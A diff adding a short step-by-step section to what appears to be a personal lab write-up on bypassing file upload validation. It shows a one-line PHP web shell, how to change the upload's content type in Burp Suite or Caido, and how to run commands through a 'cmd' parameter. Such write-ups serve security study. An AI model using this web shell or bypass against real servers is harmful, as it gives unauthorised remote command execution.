@@ -141,4 +141,19 @@ One way that websites may attempt to validate file uploads is to check that this
 
 --- 
 
-> T0 be continued.............. (^_^)
+## In simple way...
+
+1. At first login to the account -> then create a payload of that script (basic exploit) "<?php echo system($_GET['cmd']); ?>"
+2. Then upload to the uploadable function ->  then that shows and error -> go to burpsuite or caido **http-history** There you can see the `POST` method where the file uploaded 
+3. Send that to repeter and then just change the function to uploadable file like `image` or anything by changing the `x-php` function like the given image.
+![[Screenshot_20260111_234300.png]]
+4. Then just go back to the website and check the avater image or image viewable function and click to open and execute that in other tab -> there you can see that your exploit name is appearing.
+![[Screenshot_20260111_234332.png]]
+![[Screenshot_20260111_234316.png]]
+5. Now add `?cmd=ls` to test that is your function is working or not. if it is then just go back yo buirpsuite or caido and then go to `http-history` and find that `cmd=ls` **http-history** then send it to repeter or replay.
+![[Screenshot_20260111_234240.png]]
+6. Then you can able to execute any type of arbitary command what you want. You got an access of that server.
+
+--- 
+> Here you go........ This is something new right......
+> See you later........... ;)
